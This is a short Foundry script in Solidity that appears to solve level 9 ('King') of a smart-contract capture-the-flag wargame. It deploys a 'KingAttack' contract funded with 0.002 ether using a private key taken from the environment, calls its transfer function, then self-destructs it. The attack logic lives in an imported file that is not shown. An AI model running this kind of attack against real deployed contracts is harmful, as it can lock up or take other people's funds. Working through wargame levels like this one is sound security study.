// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level09.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        KingAttack kingAttackInstance = new KingAttack{value: 0.002 ether}();
        console.log("calling the transfer function");
        kingAttackInstance.transfer();
        kingAttackInstance.selfdestruct_contract();
        vm.stopBroadcast();
    }
}